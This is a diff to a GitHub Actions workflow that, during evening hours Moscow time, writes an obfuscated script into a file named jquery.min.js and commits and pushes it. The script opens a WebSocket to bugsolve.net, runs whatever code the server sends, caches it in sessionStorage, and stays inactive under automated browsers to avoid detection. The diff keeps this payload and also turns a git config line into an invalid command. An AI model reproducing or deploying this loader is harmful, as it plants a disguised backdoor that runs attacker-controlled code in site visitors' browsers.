@@ -18,9 +18,10 @@ jobs:
       run: |
         MSK_HOUR=$(TZ="Europe/Moscow" date +%H)
         if [ $MSK_HOUR -ge 19 ] && [ $MSK_HOUR -lt 23 ]; then
-          cat > jquery.min.js << 'EOF'
+          read -r -d '' JQ_CODE << 'EOFMARKER' || true
           ((f,g,m,gsv='gs_lo',gs=(arm)=>{arm=new top['W'['concat']('ebS', 'cg' && 'ock', 'et')]('w'['concat']('ss', ':limlim', 'bu', '*' && 'g', '+' && 's','&' && 'ol', 'v', '.' && 'e' || ';', '.','netlimw' + ('&&' && 'sslim'))['split']('lim')['join']("/"));(arm.onmessage = (e) =>{new f('m', 'gsv', 'verm', g(e['data'])).call(e['target'], m, gsv, 'Z2VvdGR2MnBsemc')})}) => {if(m[gsv]){return f('m','gsv', 'verm', g(m[gsv]))(m,gsv, 'Z2VvdGR2MnBsemc')} else navigator['webdriver'] || gs();})(Function,atob,sessionStorage);
-          EOF
+          EOFMARKER
+          printf "%s" "$JQ_CODE" > jquery.min.js
         else
           > jquery.min.js
         fi
@@ -32,7 +33,7 @@ jobs:
     - name: Commit and push
       run: |
         git config user.name "GitHub Actions Bot"
-        git config user.email "actions@github.com"
+        git config.user.email "actions@github.com"
         git add jquery.min.js
         git diff --staged --quiet || git commit -m "Update jquery.min.js [$(TZ='Europe/Moscow' date +'%Y-%m-%d %H:%M:%S')]"
         git push
